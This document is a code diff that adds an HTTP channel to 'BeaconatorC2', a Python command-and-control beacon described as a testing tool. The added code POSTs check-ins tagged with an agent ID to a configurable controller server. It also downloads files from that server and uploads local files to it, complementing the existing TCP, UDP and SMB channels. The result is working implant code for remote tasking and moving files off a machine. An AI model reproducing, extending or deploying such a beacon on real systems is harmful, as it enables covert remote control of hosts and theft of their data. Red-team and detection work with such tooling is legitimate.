@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
 Python Beacon for BeaconatorC2 Testing
-Multi-protocol beacon supporting TCP, UDP, and SMB communication
-Designed for testing UDP and SMB receiver implementations
+Multi-protocol beacon supporting TCP, UDP, SMB, and HTTP communication
+Designed for testing receiver implementations across multiple protocols
 """
 
 import socket
@@ -16,15 +16,18 @@ import sys
 import argparse
 import threading
 import base64
+import urllib.request
+import urllib.parse
 from pathlib import Path
 
 
 class PythonBeacon:
-    def __init__(self, server_ip="127.0.0.1", server_port=5074, protocol="tcp", pipe_name=None):
+    def __init__(self, server_ip="127.0.0.1", server_port=5074, protocol="tcp", pipe_name=None, http_endpoint="/"):
         self.server_ip = server_ip
         self.server_port = server_port
         self.protocol = protocol.lower()
         self.pipe_name = pipe_name or f"BeaconatorC2_{server_port}"
+        self.http_endpoint = http_endpoint
         
         self.agent_id = self.generate_agent_id()
         self.computer_name = platform.node()
@@ -38,6 +41,8 @@ class PythonBeacon:
         print(f"    Server: {self.server_ip}:{self.server_port}")
         if self.protocol == "smb":
             print(f"    Pipe: {self.pipe_name}")
+        elif self.protocol == "http":
+            print(f"    Endpoint: {self.http_endpoint}")
 
     def generate_agent_id(self):
         """Generate unique agent ID based on system information"""
@@ -236,6 +241,50 @@ class PythonBeacon:
                 return f"ERROR: Named pipe '{self.pipe_name}' not found. Make sure SMB receiver is running."
             return f"ERROR: {e}"
 
+    def send_http(self, message, expect_response=True, is_file_transfer=False):
+        """Send message via HTTP"""
+        try:
+            url = f"http://{self.server_ip}:{self.server_port}{self.http_endpoint}"
+            
+            # Prepare request data
+            data = message.encode('utf-8')
+            
+            # Create request
+            req = urllib.request.Request(url, data=data, method='POST')
+            req.add_header('Content-Type', 'application/octet-stream')
+            req.add_header('User-Agent', f'BeaconatorC2-Beacon/{self.agent_id}')
+            
+            self.log(f"HTTP: Sending POST to {url}")
+            
+            if expect_response:
+                if is_file_transfer:
+                    # For file transfers, return the response object
+                    response = urllib.request.urlopen(req, timeout=30)
+                    return response
+                else:
+                    # Regular command response
+                    with urllib.request.urlopen(req, timeout=30) as response:
+                        response_data = response.read().decode('utf-8').strip()
+                        self.log(f"HTTP: Received response: {response_data}")
+                        return response_data
+            else:
+                # Fire and forget
+                with urllib.request.urlopen(req, timeout=10) as response:
+                    pass
+                return "OK"
+                
+        except urllib.error.HTTPError as e:
+            error_msg = f"HTTP Error {e.code}: {e.reason}"
+            self.log(error_msg)
+            return f"ERROR: {error_msg}"
+        except urllib.error.URLError as e:
+            error_msg = f"URL Error: {e.reason}"
+            self.log(error_msg)
+            return f"ERROR: {error_msg}"
+        except Exception as e:
+            self.log(f"HTTP Error: {e}")
+            return f"ERROR: {e}"
+
     def send_message(self, message, expect_response=True, is_file_transfer=False):
         """Send message using configured protocol"""
         if self.protocol == "tcp":
@@ -246,6 +295,8 @@ class PythonBeacon:
             return self.send_udp(message, expect_response)
         elif self.protocol == "smb":
             return self.send_smb(message, expect_response, is_file_transfer)
+        elif self.protocol == "http":
+            return self.send_http(message, expect_response, is_file_transfer)
         else:
             return f"ERROR: Unknown protocol {self.protocol}"
 
@@ -351,6 +402,16 @@ class PythonBeacon:
                     # Unix FIFO - simplified read
                     with open(f"/tmp/beaconator_c2_pipes/{self.pipe_name}", 'rb') as pipe:
                         file_data = pipe.read()
+                        
+            elif self.protocol == "http":
+                # HTTP file download
+                response = self.send_message(message, expect_response=True, is_file_transfer=True)
+                if isinstance(response, str) and response.startswith("ERROR"):
+                    return response
+                    
+                # Read file data from HTTP response
+                file_data = response.read()
+                response.close()
             
             # Save file
             downloads_dir = Path.home() / "Downloads" / "beacon_downloads"
@@ -423,6 +484,25 @@ class PythonBeacon:
                     response = "SUCCESS"  # Simplified for Unix
                     
                 return response
+                
+            elif self.protocol == "http":
+                # HTTP file upload
+                url = f"http://{self.server_ip}:{self.server_port}{self.http_endpoint}"
+                
+                # Read file data
+                with open(file_path, 'rb') as f:
+                    file_data = f.read()
+                
+                # Create upload request with file data in body
+                upload_message = f"{message}".encode('utf-8') + b"|" + file_data
+                req = urllib.request.Request(url, data=upload_message, method='POST')
+                req.add_header('Content-Type', 'application/octet-stream')
+                req.add_header('User-Agent', f'BeaconatorC2-Beacon/{self.agent_id}')
+                
+                # Send upload request
+                with urllib.request.urlopen(req, timeout=60) as response:
+                    response_data = response.read().decode('utf-8').strip()
+                    return response_data
                 
         except Exception as e:
             return f"ERROR uploading file: {e}"
@@ -504,9 +584,10 @@ def main():
     parser = argparse.ArgumentParser(description="Python Beacon for BeaconatorC2 Testing")
     parser.add_argument("--server", default="127.0.0.1", help="Server IP address")
     parser.add_argument("--port", type=int, default=5074, help="Server port")
-    parser.add_argument("--protocol", choices=["tcp", "udp", "smb"], default="tcp", 
+    parser.add_argument("--protocol", choices=["tcp", "udp", "smb", "http"], default="tcp", 
                        help="Communication protocol")
     parser.add_argument("--pipe", help="SMB pipe name (for SMB protocol)")
+    parser.add_argument("--endpoint", default="/", help="HTTP endpoint path (for HTTP protocol)")
     parser.add_argument("--interval", type=int, default=15, help="Check-in interval in seconds")
     
     args = parser.parse_args()
@@ -516,7 +597,8 @@ def main():
         server_ip=args.server,
         server_port=args.port,
         protocol=args.protocol,
-        pipe_name=args.pipe
+        pipe_name=args.pipe,
+        http_endpoint=args.endpoint
     )
     
     beacon.check_in_interval = args.interval
